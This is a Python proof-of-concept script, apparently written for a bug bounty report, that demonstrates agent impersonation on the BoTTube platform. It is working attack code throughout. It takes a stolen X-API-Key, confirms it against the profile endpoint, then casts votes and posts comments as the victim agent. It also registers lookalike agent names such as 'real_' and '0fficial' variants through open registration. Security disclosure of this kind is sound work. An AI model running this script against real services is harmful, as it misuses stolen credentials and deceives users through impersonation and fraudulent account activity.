#!/usr/bin/env python3
"""
BoTTube PoC #3: Agent Impersonation
====================================
Bounty #247 — Vulnerability 3: Agent Impersonation

Demonstrates that:
1. Authentication relies solely on X-API-Key header (no IP binding, no device fingerprint)
2. API keys are returned in registration responses and can be intercepted/leaked
3. No secondary verification for sensitive actions (upload, comment, vote, tip)
4. Open registration allows creating agents that impersonate real entities

Attack vectors:
A) API Key Theft:
   - If an agent's API key is exposed (GitHub commit, logs, intercepted response)
   - An attacker can fully impersonate that agent: vote, comment, upload, tip

B) Registration Impersonation:
   - Agent names follow pattern: [a-z0-9_-]{2,32}
   - An attacker can register names similar to legitimate agents
   - No identity verification beyond the optional X/Twitter claim

C) Claim Token Exposure:
   - Claim URLs are public: https://bottube.ai/claim/{agent_name}/{claim_token}
   - While the claim token doesn't directly grant access, it's part of the auth chain

Usage:
    python3 poc_agent_impersonation.py --target https://bottube.ai --stolen-key <key>
"""

import argparse
import json
import sys
import time
import urllib.request
import urllib.error


def api_request(base_url, path, method="GET", data=None, api_key=None):
    """Make an API request to BoTTube."""
    url = f"{base_url.rstrip('/')}{path}"
    headers = {"Content-Type": "application/json"}
    if api_key:
        headers["X-API-Key"] = api_key

    body = json.dumps(data).encode() if data else None
    req = urllib.request.Request(url, data=body, headers=headers, method=method)

    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())
    except Exception as e:
        return 0, {"error": str(e)}


def get_agent_profile(base_url, api_key):
    """Get the authenticated agent's profile."""
    return api_request(base_url, "/api/agents/me", "GET", api_key=api_key)


def register_similar_agent(base_url, target_name):
    """Register an agent with a similar name to impersonate."""
    # Try common impersonation patterns
    variations = [
        f"{target_name}",           # Exact (will fail if exists)
        f"{target_name}0fficial",   # "official" suffix
        f"{target_name}_bot",       # _bot suffix
        f"real_{target_name}",      # "real_" prefix
        f"{target_name}-ai",        # -ai suffix
    ]

    registered = []
    for name in variations:
        status, resp = api_request(base_url, "/api/register", "POST", {
            "agent_name": name,
            "display_name": name.replace("_", " ").title(),
        })
        if status == 200 and resp.get("ok"):
            registered.append({
                "name": name,
                "api_key": resp.get("api_key"),
                "claim_url": resp.get("claim_url"),
            })
            print(f"  [+] Registered impersonator: {name}")
        time.sleep(0.5)
    return registered


def impersonate_actions(base_url, api_key, target_video_id):
    """Perform actions as the impersonated agent."""
    results = []

    # Action 1: Vote
    status, resp = api_request(
        base_url,
        f"/api/videos/{target_video_id}/vote",
        "POST",
        {"vote": 1},
        api_key=api_key,
    )
    results.append({"action": "vote", "status": status, "response": resp})
    print(f"  [+] Vote: HTTP {status}")

    # Action 2: Comment
    status, resp = api_request(
        base_url,
        f"/api/videos/{target_video_id}/comment",
        "POST",
        {"content": "Impersonated comment from stolen API key"},
        api_key=api_key,
    )
    results.append({"action": "comment", "status": status, "response": resp})
    print(f"  [+] Comment: HTTP {status}")

    return results


def main():
    parser = argparse.ArgumentParser(description="BoTTube Agent Impersonation PoC")
    parser.add_argument("--target", default="http://localhost:5000", help="BoTTube server URL")
    parser.add_argument("--stolen-key", help="Stolen API key to impersonate with")
    parser.add_argument("--impersonate", help="Agent name to impersonate (registration attack)")
    parser.add_argument("--video-id", default="test-video-001", help="Target video ID")
    args = parser.parse_args()

    print("=" * 60)
    print("BoTTube Agent Impersonation PoC (Bounty #247)")
    print("=" * 60)

    if args.stolen_key:
        # Attack vector A: Using a stolen API key
        print(f"\n[1] Attack Vector A: Stolen API Key")
        print(f"    Using API key: {args.stolen_key[:12]}...")

        # Step 1: Verify the key works
        print(f"\n[1a] Getting agent profile...")
        status, resp = get_agent_profile(args.target, args.stolen_key)
        if status == 200:
            agent_name = resp.get("agent_name", "unknown")
            print(f"  [+] Authenticated as: {agent_name}")
            print(f"  [+] Profile: {json.dumps(resp, indent=2)[:200]}...")
        else:
            print(f"  [-] Authentication failed: HTTP {status}")
            print(f"  [-] Response: {resp}")
            sys.exit(1)

        # Step 2: Perform actions as the impersonated agent
        print(f"\n[1b] Performing actions as {agent_name}...")
        results = impersonate_actions(args.target, args.stolen_key, args.video_id)

        print(f"\n[1c] Impersonation impact:")
        print(f"  - Full access to all agent actions (vote, comment, upload, tip)")
        print(f"  - No additional verification required")
        print(f"  - No IP/device binding on the API key")
        print(f"  - Victim cannot revoke the key without admin intervention")

    if args.impersonate:
        # Attack vector B: Registration-based impersonation
        print(f"\n\n[2] Attack Vector B: Registration Impersonation")
        print(f"    Target: {args.impersonate}")

        print(f"\n[2a] Registering similar agent names...")
        impersonators = register_similar_agent(args.target, args.impersonate)

        if impersonators:
            print(f"\n[2b] Successfully registered {len(impersonators)} impersonator(s):")
            for imp in impersonators:
                print(f"  - {imp['name']} (API key: {imp['api_key'][:12]}...)")

            print(f"\n[2c] Impact:")
            print(f"  - Users may mistake these for the real agent")
            print(f"  - Impersonators can build reputation/following")
            print(f"  - Can be used for social engineering or phishing")

    if not args.stolen_key and not args.impersonate:
        print(f"\n[!] Provide --stolen-key or --impersonate to run attacks")
        print(f"\n  Examples:")
        print(f"    python3 {sys.argv[0]} --stolen-key <key> --video-id <id>")
        print(f"    python3 {sys.argv[0]} --impersonate famous_agent --target http://localhost:5000")

    print(f"\n{'=' * 60}")
    print("PoC complete. See bottube_audit_report.md for full analysis.")
    print(f"{'=' * 60}")


if __name__ == "__main__":
    main()
